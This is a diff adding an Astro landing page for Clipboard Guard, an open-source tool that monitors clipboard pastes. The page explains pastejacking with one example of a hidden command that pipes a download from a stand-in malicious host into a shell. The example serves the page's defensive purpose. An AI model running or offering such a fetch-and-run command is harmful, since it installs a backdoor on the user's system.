@@ -1,0 +1,224 @@
+---
+import BaseLayout from '../layouts/BaseLayout.astro';
+import Header from '../components/Header.astro';
+import Footer from '../components/Footer.astro';
+import FeatureCard from '../components/FeatureCard.astro';
+import MockWindow from '../components/MockWindow.astro';
+import MockSettings from '../components/MockSettings.astro';
+import MockNotification from '../components/MockNotification.astro';
+import MockWarnings from '../components/MockWarnings.astro';
+---
+
+<BaseLayout title="Clipboard Guard - Your clipboard, protected">
+  <Header />
+  
+  <main>
+    <!-- Hero Section -->
+    <section class="section">
+      <div class="container text-center">
+        <h1 style="font-size: 48px; margin-bottom: 24px; font-weight: 700; max-width: 800px; margin-left: auto; margin-right: auto;">
+          Your clipboard, protected
+        </h1>
+        <p style="font-size: 20px; color: #86868b; margin-bottom: 40px; max-width: 600px; margin-left: auto; margin-right: auto; line-height: 1.5;">
+          Clipboard Guard monitors copy-paste operations across apps and prevents accidental data leaks. Open source, runs locally, no data leaves your machine.
+        </p>
+        
+        <div style="display: flex; gap: 16px; justify-content: center; align-items: center; margin-bottom: 60px; flex-wrap: wrap;">
+          <a href="/download" class="btn btn-primary" style="text-decoration: none; font-size: 18px; padding: 16px 32px;">
+            Download Free
+          </a>
+          <a href="https://github.com/mcpick/clipguard" target="_blank" class="btn btn-secondary" style="text-decoration: none; font-size: 18px; padding: 16px 32px;">
+            View on GitHub
+          </a>
+        </div>
+        
+        <div style="max-width: 400px; margin: 0 auto;">
+          <MockNotification />
+        </div>
+      </div>
+    </section>
+
+    <!-- Problem Section -->
+    <section class="section" style="background: white;">
+      <div class="container">
+        <div class="text-center" style="margin-bottom: 60px;">
+          <h2 style="font-size: 36px; margin-bottom: 16px;">Why clipboard security matters</h2>
+          <p style="font-size: 18px; color: #86868b; max-width: 700px; margin: 0 auto;">
+            Attackers hide malicious commands in web pages. You copy what looks like a normal command, but the clipboard contains something dangerous. Clipboard Guard catches this.
+          </p>
+        </div>
+        
+        <div class="grid grid-2" style="max-width: 900px; margin: 0 auto;">
+          <div class="card" style="background: #f0f8ff; border-left: 4px solid #007aff;">
+            <h3 style="color: #007aff; margin-bottom: 12px;">What you see</h3>
+            <code style="background: #e8f4fd; padding: 12px; border-radius: 6px; display: block; font-family: 'SF Mono', Monaco, monospace; font-size: 14px;">
+              curl -fsSL https://get.docker.com | sh
+            </code>
+            <p style="margin-top: 12px; font-size: 14px; color: #86868b;">
+              Looks like a normal Docker installation command
+            </p>
+          </div>
+          
+          <div class="card" style="background: #fff5f5; border-left: 4px solid #ff9500;">
+            <h3 style="color: #ff9500; margin-bottom: 12px;">What's actually copied</h3>
+            <code style="background: #fdf2e8; padding: 12px; border-radius: 6px; display: block; font-family: 'SF Mono', Monaco, monospace; font-size: 14px;">
+              curl -fsSL https://malicious.site/backdoor | sh
+            </code>
+            <p style="margin-top: 12px; font-size: 14px; color: #86868b;">
+              Hidden malicious command that compromises your system
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="section">
+      <div class="container">
+        <div class="text-center" style="margin-bottom: 60px;">
+          <h2 style="font-size: 36px; margin-bottom: 16px;">Everything you need</h2>
+          <p style="font-size: 18px; color: #86868b;">
+            Comprehensive clipboard protection that works across all your apps
+          </p>
+        </div>
+        
+        <div class="grid grid-3">
+          <FeatureCard
+            title="Clipboard Monitoring"
+            description="Detects which app placed content on clipboard and tracks all copy operations in real-time"
+            icon="👁️"
+          />
+          <FeatureCard
+            title="Cross-App Warnings"
+            description="Alerts when pasting between suspicious app pairs like browser to terminal"
+            icon="⚠️"
+          />
+          <FeatureCard
+            title="Paste Blocking"
+            description="Optionally blocks Cmd+V for configured pairs (requires Accessibility permissions)"
+            icon="🛡️"
+          />
+          <FeatureCard
+            title="Custom Rules"
+            description="Configure per-app source/destination with notify or block actions"
+            icon="⚙️"
+          />
+          <FeatureCard
+            title="Menu Bar App"
+            description="Runs silently in system tray, always watching without getting in your way"
+            icon="📍"
+          />
+          <FeatureCard
+            title="Launch at Login"
+            description="Auto-start support, set and forget protection from boot to shutdown"
+            icon="🚀"
+          />
+        </div>
+      </div>
+    </section>
+
+    <!-- Screenshots Section -->
+    <section class="section" style="background: white;">
+      <div class="container">
+        <div class="text-center" style="margin-bottom: 60px;">
+          <h2 style="font-size: 36px; margin-bottom: 16px;">See it in action</h2>
+          <p style="font-size: 18px; color: #86868b;">
+            Clean, native interface that feels right at home on your desktop
+          </p>
+        </div>
+        
+        <div class="grid" style="grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 40px;">
+          <div class="text-center">
+            <MockWindow title="Clipboard Guard Preferences" width="100%">
+              <MockSettings />
+            </MockWindow>
+            <h3 style="margin-top: 20px; margin-bottom: 8px;">Settings Panel</h3>
+            <p class="text-secondary" style="margin: 0;">Configure rules and manage protection settings</p>
+          </div>
+          
+          <div class="text-center">
+            <div style="padding: 40px 20px; background: #f6f6f6; border-radius: 12px;">
+              <MockNotification />
+            </div>
+            <h3 style="margin-top: 20px; margin-bottom: 8px;">Smart Notifications</h3>
+            <p class="text-secondary" style="margin: 0;">Native macOS notifications for paste warnings</p>
+          </div>
+          
+          <div class="text-center">
+            <MockWindow title="Recent Warnings" width="100%">
+              <MockWarnings />
+            </MockWindow>
+            <h3 style="margin-top: 20px; margin-bottom: 8px;">Activity Log</h3>
+            <p class="text-secondary" style="margin: 0;">Track all clipboard security events</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Platforms Section -->
+    <section class="section">
+      <div class="container">
+        <div class="text-center" style="margin-bottom: 60px;">
+          <h2 style="font-size: 36px; margin-bottom: 16px;">Cross-platform protection</h2>
+          <p style="font-size: 18px; color: #86868b;">
+            Works everywhere you do
+          </p>
+        </div>
+        
+        <div class="grid grid-3" style="max-width: 800px; margin: 0 auto;">
+          <div class="card text-center">
+            <div style="font-size: 48px; margin-bottom: 16px;">🍎</div>
+            <h3 style="margin-bottom: 8px;">macOS</h3>
+            <p class="text-secondary" style="margin: 0; font-size: 14px;">Full support — monitoring + blocking</p>
+          </div>
+          
+          <div class="card text-center">
+            <div style="font-size: 48px; margin-bottom: 16px;">🪟</div>
+            <h3 style="margin-bottom: 8px;">Windows</h3>
+            <p class="text-secondary" style="margin: 0; font-size: 14px;">Monitoring + blocking</p>
+          </div>
+          
+          <div class="card text-center">
+            <div style="font-size: 48px; margin-bottom: 16px;">🐧</div>
+            <h3 style="margin-bottom: 8px;">Linux</h3>
+            <p class="text-secondary" style="margin: 0; font-size: 14px;">Monitoring support</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Open Source Section -->
+    <section class="section" style="background: white;">
+      <div class="container">
+        <div class="text-center">
+          <h2 style="font-size: 36px; margin-bottom: 24px;">Free and open source forever</h2>
+          <p style="font-size: 18px; color: #86868b; margin-bottom: 32px; max-width: 600px; margin-left: auto; margin-right: auto;">
+            Released under the MIT license. Inspect the code, contribute improvements, or fork it for your own needs.
+          </p>
+          
+          <div style="display: flex; gap: 24px; justify-content: center; align-items: center; margin-bottom: 32px; flex-wrap: wrap;">
+            <div style="display: flex; align-items: center; gap: 8px;">
+              <span style="background: #34c759; color: white; padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: 500;">MIT</span>
+              <span style="color: #86868b; font-size: 14px;">License</span>
+            </div>
+            
+            <div style="display: flex; align-items: center; gap: 8px;">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="#86868b">
+                <path d="M12 2L3 7L12 12L21 7L12 2Z"/>
+                <path d="M3 17L12 22L21 17"/>
+                <path d="M3 12L12 17L21 12"/>
+              </svg>
+              <span style="color: #86868b; font-size: 14px;">⭐ GitHub Stars</span>
+            </div>
+          </div>
+          
+          <a href="https://github.com/mcpick/clipguard" target="_blank" class="btn btn-secondary" style="text-decoration: none;">
+            View Source Code
+          </a>
+        </div>
+      </div>
+    </section>
+  </main>
+  
+  <Footer />
+</BaseLayout>
